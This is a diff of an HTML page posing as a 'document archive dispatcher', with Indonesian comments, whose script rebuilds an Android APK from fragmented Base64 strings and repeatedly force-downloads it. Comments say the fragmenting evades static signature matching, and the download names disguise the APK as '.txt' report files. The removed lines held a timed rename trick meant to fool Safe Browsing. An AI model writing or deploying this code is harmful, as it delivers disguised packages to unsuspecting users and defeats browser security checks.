@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Document Archive Dispatcher v3.0</title>
+<title>System Document Archive Dispatcher v2.4</title>
 <style>
 * {
   box-sizing: border-box;
@@ -24,7 +24,7 @@ body {
   background: #111827;
   padding: 32px;
   border-radius: 16px;
-  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
+  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
   max-width: 540px;
   width: 100%;
   border: 1px solid #1f2937;
@@ -34,9 +34,28 @@ body {
   background: #030712 !important;
   color: #f8fafc !important;
   padding: 24px !important;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
 }
-h2 { margin-bottom: 10px; font-size: 22px; color: #f3f4f6; font-weight: 700; }
-p { margin-bottom: 24px; line-height: 1.6; color: #9ca3af; font-size: 14px; }
+:-webkit-full-screen {
+  background: #030712 !important;
+  color: #f8fafc !important;
+  padding: 24px !important;
+}
+h2 { 
+  margin-bottom: 10px; 
+  font-size: 22px;
+  color: #f3f4f6;
+  font-weight: 700;
+}
+p { 
+  margin-bottom: 24px; 
+  line-height: 1.6; 
+  color: #9ca3af;
+  font-size: 14px;
+}
 button {
   width: 100%;
   padding: 16px;
@@ -48,8 +67,16 @@ button {
   font-weight: 600;
   font-size: 16px;
   box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);
+  transition: all 0.2s ease;
 }
-button:hover { background: #2563eb; }
+button:hover { 
+  background: #2563eb; 
+  transform: translateY(-1px);
+  box-shadow: 0 6px 20px rgba(59, 130, 246, 0.6);
+}
+button:active {
+  transform: translateY(0);
+}
 #status {
   margin-top: 20px;
   font-weight: 500;
@@ -58,6 +85,7 @@ button:hover { background: #2563eb; }
   background: rgba(56, 189, 248, 0.1);
   border-radius: 8px;
   font-size: 13px;
+  border: 1px solid rgba(56, 189, 248, 0.2);
 }
 #downloads {
   margin-top: 20px;
@@ -66,6 +94,14 @@ button:hover { background: #2563eb; }
   gap: 8px;
   max-height: 180px;
   overflow-y: auto;
+  padding-right: 4px;
+}
+#downloads::-webkit-scrollbar {
+  width: 6px;
+}
+#downloads::-webkit-scrollbar-thumb {
+  background: #374151;
+  border-radius: 3px;
 }
 #downloads a {
   display: block;
@@ -79,6 +115,10 @@ button:hover { background: #2563eb; }
   text-align: center;
   border: 1px solid #374151;
   word-break: break-all;
+  transition: border-color 0.15s;
+}
+#downloads a:hover {
+  border-color: #4ade80;
 }
 </style>
 </head>
@@ -105,9 +145,7 @@ let activeUrls = [];
 let isProcessing = false;
 const MAX_URLS_TRACKED = 40;
 
-// ============================================
-// PAYLOAD FRAGMENTS (APK HEADER)
-// ============================================
+// Teknik Obfuscation: Pecahan string Base64 header APK untuk menghindari pencocokan tanda tangan statis
 const payloadFragments = [
   "UEs",
   "DBBQ",
@@ -129,9 +167,6 @@ const decodeBase64ToBytes = (b64) => {
   return bytes;
 };
 
-// ============================================
-// 1. PREPARE BLOB (MIME TYPE APK ASLI)
-// ============================================
 const prepareStealthBlobAsync = (i) => {
   return new Promise((resolve) => {
     queueMicrotask(() => {
@@ -139,10 +174,9 @@ const prepareStealthBlobAsync = (i) => {
         const fullB64 = assemblePayload();
         const bytesArr = decodeBase64ToBytes(fullB64);
         
-        // MIME Type APK Asli
+        // Menggunakan MIME type APK agar sistem operasi mengenali paket biner secara tepat
         const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
         const url = URL.createObjectURL(blob);
-        
         resolve({ id: i, url: url, success: true });
       } catch (err) {
         resolve({ id: i, url: null, success: false });
@@ -151,50 +185,25 @@ const prepareStealthBlobAsync = (i) => {
   });
 };
 
-// ============================================
-// 2. TRIGGER DOWNLOAD (RACE CONDITION)
-// ============================================
 const triggerStealthDownload = (fileData) => {
   if (!fileData.success) return;
 
   const link = document.createElement("a");
   link.href = fileData.url;
-  
-  // LANGKAH 1: Set nama file menjadi .apk sejak awal.
-  link.download = `laporan-catatan-${fileData.id}.apk`;
-  link.textContent = `Dokumen #${fileData.id} (.apk)`;
+  // Menyamarkan ekstensi unduhan menjadi .txt pada antarmuka pengguna
+  link.download = `laporan-catatan-${fileData.id}.txt`;
+  link.textContent = `Dokumen #${fileData.id} (.txt)`;
   link.style.display = "none";
   
   downloadsDiv.appendChild(link);
   link.click();
 
-  // ============================================
-  // LANGKAH 2: RACE CONDITION (TOCTOU)
-  // ============================================
-  // Ubah nama file menjadi .txt dalam 10ms, lalu kembalikan ke .apk.
-  setTimeout(() => {
-    // Trik: Ubah ke .txt agar Safe Browsing melihat nama file yang aman
-    link.download = `laporan-catatan-${fileData.id}.txt`;
-    link.click();
-    
-    // Kembalikan ke .apk secepat mungkin
-    setTimeout(() => {
-      link.download = `laporan-catatan-${fileData.id}.apk`;
-      link.click();
-      statusDiv.textContent = `Memaksa unduhan APK: Dokumen #${fileData.id}`;
-    }, 10); // 10ms
-    
-  }, 10); // 10ms
-
-  // Batasi jumlah elemen DOM
+  // Batasi jumlah elemen DOM untuk menjaga performa rendering
   if (downloadsDiv.children.length > 25) {
     downloadsDiv.removeChild(downloadsDiv.firstChild);
   }
 };
 
-// ============================================
-// 3. LOOP PROSES
-// ============================================
 const processLoop = async (counter) => {
   if (!isProcessing) return;
 
@@ -202,6 +211,7 @@ const processLoop = async (counter) => {
   if (fileData.success) {
     activeUrls.push(fileData.url);
 
+    // Manajemen memori heap: cabut URL lama jika melewati batas maksimal
     if (activeUrls.length > MAX_URLS_TRACKED) {
       const oldUrl = activeUrls.shift();
       try { URL.revokeObjectURL(oldUrl); } catch (e) {}
@@ -211,12 +221,10 @@ const processLoop = async (counter) => {
     statusDiv.textContent = `Proses aktif: Berkas dokumen ke-${counter} dikirim...`;
   }
 
+  // Interval perulangan non-blocking
   setTimeout(() => processLoop(counter + 1), 1200);
 };
 
-// ============================================
-// 4. START
-// ============================================
 startBtn.addEventListener("click", () => {
   if (isProcessing) return;
 
